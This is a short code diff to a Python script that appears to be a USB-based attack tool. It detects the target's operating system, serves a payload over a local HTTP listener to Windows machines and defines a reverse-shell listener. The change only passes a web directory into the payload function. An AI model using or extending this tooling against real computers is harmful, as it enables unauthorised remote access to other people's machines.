@@ -58,7 +58,7 @@ def reverse_shell_listener():
 		exit() # Using [ctrl+c] will terminate the listener.
 
 
-def payload(httpd):
+def payload(web_dir, httpd):
 	eco.change_hid()
 	connected=False
 	print("Waiting for network to come up")
@@ -67,6 +67,7 @@ def payload(httpd):
 		if(response == 0):
 			connected=True
 	print("Network up")
+	os.chdir(web_dir)
 	httplistener=Process(target=httpd.handle_request)
 	httplistener.start()
 	os.chdir("..")
@@ -120,7 +121,7 @@ while(1):
 		print("Target OS is: " + detectedos)
 		sleep(2)
 		if "Windows" == detectedos:
-			payload(httpd)
+			payload(web_dir, httpd)
 		print("Payload completed")
 		# Switch back to simple gadget
 		if "Windows" == detectedos:
